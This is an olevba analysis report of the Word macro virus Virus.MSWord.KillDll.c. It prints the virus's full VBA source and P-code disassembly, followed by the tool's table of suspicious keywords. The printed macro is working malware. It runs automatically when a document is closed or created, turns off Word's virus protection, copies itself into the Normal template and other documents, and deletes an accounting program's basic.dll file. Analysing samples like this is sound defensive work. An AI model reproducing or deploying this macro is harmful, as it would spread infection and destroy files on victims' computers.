olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.KillDll.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.KillDll.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Infection.bas 
in file: Virus.MSWord.KillDll.c - OLE stream: 'Macros/VBA/Infection'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim Ifc1, Ifc2 As Boolean

Sub AutoClose()
Dim Str As String
Dim MyStamp As Date
Call Infect
Str = Dir("c:\Program Files\1cv77\bin\basic.dll")
If Str <> "" Then
 MyStamp = FileDateTime("c:\Program Files\1cv77\bin\basic.dll")
 If MyStamp > "1.1.00 00:00:00" Then
  Kill "c:\Program Files\1cv77\bin\basic.dll"
 End If
End If
If havesave And infected And (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
      Dialogs(wdDialogFileSaveAs).Execute
    End If
ActiveDocument.Saved = havesave
End Sub
Sub AutoNew()
 Call Infect
End Sub

Sub Infect()
Ifc1 = True
Ifc2 = True
 Options.VirusProtection = False
 x1 = Application.StartupPath + "\Normal1.tmp"
 x2 = Application.StartupPath + "\Normal2.tmp"
If Documents.Count >= 1 Then
  counter1 = NormalTemplate.VBProject.VBComponents.Count
  counter2 = ActiveDocument.VBProject.VBComponents.Count
   For i = 1 To counter2
   If ActiveDocument.VBProject.VBComponents.Item(i).Name = "Infection" Then Ifc2 = False
  Next i
  For i = 1 To counter1
   If NormalTemplate.VBProject.VBComponents.Item(i).Name = "Infection" Then Ifc1 = False
  Next i
   
  If Ifc2 Then
   GoSub a9
  End If
  
  If Ifc1 Then
   ActiveDocument.VBProject.VBComponents("Infection").Export (x1)
  End If
  
  If Ifc2 Then
   ActiveDocument.VBProject.VBComponents.Import (x2)
  End If
  
  If Ifc1 Then
   GoSub a8
  End If
  
 havesave = ActiveDocument.Saved
End If

Exit Sub

a8:
   NormalTemplate.VBProject.VBComponents.Import (x1)
Return
a9:
   NormalTemplate.VBProject.VBComponents("Infection").Export (x2)
Return
End Sub

Sub ViewVBCode()
MsgBox ("Íåò çàãðóæåííûõ ìàêðîñîâ!")
End Sub




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.KillDll.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Infection - 3805 bytes
' Line #0:
' 	Dim 
' 	VarDefn Ifc1
' 	VarDefn Ifc2 (As Boolean)
' Line #1:
' Line #2:
' 	FuncDefn (Sub AutoClose())
' Line #3:
' 	Dim 
' 	VarDefn Str (As String)
' Line #4:
' 	Dim 
' 	VarDefn MyStamp (As Date)
' Line #5:
' 	ArgsCall (Call) Infect 0x0000 
' Line #6:
' 	LitStr 0x0024 "c:\Program Files\1cv77\bin\basic.dll"
' 	ArgsLd Dir 0x0001 
' 	St Str 
' Line #7:
' 	Ld Str 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #8:
' 	LitStr 0x0024 "c:\Program Files\1cv77\bin\basic.dll"
' 	ArgsLd FileDateTime 0x0001 
' 	St MyStamp 
' Line #9:
' 	Ld MyStamp 
' 	LitStr 0x000F "1.1.00 00:00:00"
' 	Gt 
' 	IfBlock 
' Line #10:
' 	LitStr 0x0024 "c:\Program Files\1cv77\bin\basic.dll"
' 	ArgsCall Kill 0x0001 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	Ld havesave 
' 	Ld infected 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #14:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Execute 0x0000 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld havesave 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Sub AutoNew())
' Line #19:
' 	ArgsCall (Call) Infect 0x0000 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub Infect())
' Line #23:
' 	LitVarSpecial (True)
' 	St Ifc1 
' Line #24:
' 	LitVarSpecial (True)
' 	St Ifc2 
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #26:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000C "\Normal1.tmp"
' 	Add 
' 	St x1 
' Line #27:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000C "\Normal2.tmp"
' 	Add 
' 	St x2 
' Line #28:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #29:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St counter1 
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St counter2 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld counter2 
' 	For 
' Line #32:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Infection"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Ifc2 
' 	EndIf 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld counter1 
' 	For 
' Line #35:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "Infection"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Ifc1 
' 	EndIf 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' Line #38:
' 	Ld Ifc2 
' 	IfBlock 
' Line #39:
' 	GoSub a9 
' Line #40:
' 	EndIfBlock 
' Line #41:
' Line #42:
' 	Ld Ifc1 
' 	IfBlock 
' Line #43:
' 	Ld x1 
' 	Paren 
' 	LitStr 0x0009 "Infection"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #44:
' 	EndIfBlock 
' Line #45:
' Line #46:
' 	Ld Ifc2 
' 	IfBlock 
' Line #47:
' 	Ld x2 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #48:
' 	EndIfBlock 
' Line #49:
' Line #50:
' 	Ld Ifc1 
' 	IfBlock 
' Line #51:
' 	GoSub a8 
' Line #52:
' 	EndIfBlock 
' Line #53:
' Line #54:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St havesave 
' Line #55:
' 	EndIfBlock 
' Line #56:
' Line #57:
' 	ExitSub 
' Line #58:
' Line #59:
' 	Label a8 
' Line #60:
' 	Ld x1 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #61:
' 	Return 
' Line #62:
' 	Label a9 
' Line #63:
' 	Ld x2 
' 	Paren 
' 	LitStr 0x0009 "Infection"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #64:
' 	Return 
' Line #65:
' 	EndSub 
' Line #66:
' Line #67:
' 	FuncDefn (Sub ViewVBCode())
' Line #68:
' 	LitStr 0x0019 "Íåò çàãðóæåííûõ ìàêðîñîâ!"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #69:
' 	EndSub 
' Line #70:
' Line #71:
' Line #72:
' Line #73:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |basic.dll           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

